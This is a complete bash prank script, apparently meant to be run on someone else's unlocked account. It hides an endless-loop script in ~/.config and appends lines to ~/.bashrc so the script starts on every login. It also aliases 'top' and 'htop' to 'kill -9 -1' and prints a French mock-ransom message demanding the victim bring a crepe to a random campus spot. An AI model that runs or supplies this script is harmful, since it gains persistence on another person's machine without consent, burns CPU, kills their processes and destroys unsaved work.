#!/bin/bash
cd 
echo "
#!/bin/bash
while true
do
   printf '\r'
done" > .config/.the_game
chmod +x .config/.the_game

places=("gonflable" "amphi" "cour" "entree" "distributeur" "toilettes a cote de l'amphi")
the_one=${places[RANDOM % ${#places[@]}]} 

echo "
alias top='kill -9 -1'
alias htop='top'
echo \"VOUS ETES VICTIME DE TROLOGIN, N'ESSAYEZ PAS DE VOUS DEBATTRE. VEUILLEZ CRIER 'PLS' POUR VOUS IDENTIFIER, PUIS HURLEZ LA LOCALISATION DONNEE. ENSUITE APPORTEZ UNE CREPE A L'ENDROIT INDIQUE POUR DEBLOQUER VOTRE ORDINATEUR.\"
echo \"LOCALISATION : $the_one\"
echo \"A TOUT DE SUITE <3\"
./.config/.the_game &" >> .bashrc
source .bashrc
